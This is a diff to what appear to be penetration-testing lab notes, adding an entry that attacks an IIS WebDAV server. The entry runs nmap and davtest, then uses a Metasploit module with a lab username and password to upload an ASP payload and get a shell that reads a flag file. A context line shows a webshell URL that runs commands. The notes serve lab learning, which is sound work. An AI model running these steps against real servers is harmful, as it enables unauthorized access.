@@ -456,12 +456,33 @@ http://10.0.16.177/webdav/webshell.asp?cmd=whoami
 dir C:\
 type C:\type flag.txt
 ```
-27)  
+27)  Windows: IIS Server: WebDav Metasploit
 
 ```
-
+cat /root/Desktop/target
+nmap 10.0.17.27
+nmap --script http-enum -sV -p 80 10.0.17.27
+davtest -url http://10.0.17.27/webdav
+davtest -auth bob:password_123321 -url http://10.0.17.27/webdav
+msfconsole -q
+use exploit/windows/iis/iis_webdav_upload_asp
+set RHOSTS 10.0.17.27
+set HttpUsername bob
+set HttpPassword password_123321
+set PATH /webdav/metasploit%RAND%.asp
+exploit
+shell
+cd /
+dir
+type flag.txt
 ```
 28)  
+
+```
+
+```
+
+29)  
 
 ```
 
